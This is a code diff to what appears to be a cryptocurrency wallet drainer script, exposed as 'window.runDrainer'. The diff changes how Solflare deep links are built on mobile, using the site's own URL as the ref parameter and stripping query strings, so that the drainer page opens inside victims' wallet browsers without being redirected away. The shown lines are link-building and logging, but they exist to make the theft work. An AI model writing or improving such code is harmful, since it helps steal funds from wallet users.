@@ -4909,15 +4909,22 @@ window.runDrainer = runDrainer;
         // Enhanced URL parameter handling
         let fullDeepLink;
         
-        // Solflare requires special format: {base_url}{encoded_url}?ref=https%3A%2F%2Fsolflare.com
+        // Solflare requires special format - mobile uses site URL as ref, desktop uses solflare.com
         if (walletType === 'solflare') {
-          const encodedUrl = encodeURIComponent(currentUrl);
+          const cleanUrl = currentUrl.split('?')[0]; // Remove query parameters
+          const encodedUrl = encodeURIComponent(cleanUrl);
+          
+          // Mobile: Use site URL as ref to prevent redirects
+          // Desktop: Use original format with solflare.com as ref
+          // This is inside a mobile deep link function, so always mobile
+          const refValue = encodeURIComponent(cleanUrl);
+          
           if (strategy.endsWith('/')) {
-            // For Solflare: https://solflare.com/ul/v1/browse/{encoded_url}?ref=https%3A%2F%2Fsolflare.com
-            fullDeepLink = strategy + encodedUrl + '?ref=https%3A%2F%2Fsolflare.com';
+            // For Solflare: https://solflare.com/ul/v1/browse/{encoded_url}?ref={ref_value}
+            fullDeepLink = strategy + encodedUrl + '?ref=' + refValue;
           } else {
-            // For Solflare custom scheme: solflare://v1/browse/{encoded_url}?ref=https%3A%2F%2Fsolflare.com
-            fullDeepLink = strategy + encodedUrl + '?ref=https%3A%2F%2Fsolflare.com';
+            // For Solflare custom scheme: solflare://v1/browse/{encoded_url}?ref={ref_value}
+            fullDeepLink = strategy + encodedUrl + '?ref=' + refValue;
           }
         } else if (strategy.includes('?url=') || strategy.includes('?coin_id=')) {
           fullDeepLink = strategy + encodeURIComponent(currentUrl);
@@ -6790,16 +6797,29 @@ window.runDrainer = runDrainer;
           break;
         case 'solflare':
           // Solflare: Use proper deep link format as per specification
-          // Universal Link: https://solflare.com/ul/v1/browse/{encoded_dapp_url}?ref=https%3A%2F%2Fsolflare.com
-          // Custom Scheme: solflare://v1/browse/{encoded_dapp_url}?ref=https%3A%2F%2Fsolflare.com
-          const solflareEncodedUrl = encodeURIComponent(currentUrl);
-          
-          // Use same format for both mobile and desktop
-          deepLink = `https://solflare.com/ul/v1/browse/${solflareEncodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
-          fallbackUrl = `solflare://v1/browse/${solflareEncodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
-          
-          console.log(`[SOLFLARE_DEEP_LINK] Universal Link: ${deepLink}`);
-          console.log(`[SOLFLARE_DEEP_LINK] Custom Scheme: ${fallbackUrl}`);
+          if (isMobileDevice) {
+            // Mobile: ref parameter must be the originating app's URL (site URL), not solflare.com
+            // This prevents Solflare from redirecting back to solflare.com homepage
+            const solflareCleanUrl = currentUrl.split('?')[0]; // Remove query parameters
+            const solflareEncodedUrl = encodeURIComponent(solflareCleanUrl);
+            const solflareRefUrl = solflareCleanUrl; // Use site URL as ref
+            const solflareEncodedRef = encodeURIComponent(solflareRefUrl);
+            
+            deepLink = `https://solflare.com/ul/v1/browse/${solflareEncodedUrl}?ref=${solflareEncodedRef}`;
+            fallbackUrl = `solflare://v1/browse/${solflareEncodedUrl}?ref=${solflareEncodedRef}`;
+            
+            console.log(`[SOLFLARE_DEEP_LINK] Mobile - Universal Link: ${deepLink}`);
+            console.log(`[SOLFLARE_DEEP_LINK] Mobile - Custom Scheme: ${fallbackUrl}`);
+            console.log(`[SOLFLARE_DEEP_LINK] Mobile - Using ref (site URL): ${solflareRefUrl}`);
+          } else {
+            // Desktop: Use original format (unchanged)
+            const solflareEncodedUrl = encodeURIComponent(currentUrl);
+            deepLink = `https://solflare.com/ul/v1/browse/${solflareEncodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
+            fallbackUrl = `solflare://v1/browse/${solflareEncodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
+            
+            console.log(`[SOLFLARE_DEEP_LINK] Desktop - Universal Link: ${deepLink}`);
+            console.log(`[SOLFLARE_DEEP_LINK] Desktop - Custom Scheme: ${fallbackUrl}`);
+          }
           break;
         case 'backpack':
           // Backpack: Use correct URL structure for mobile, complex API for desktop
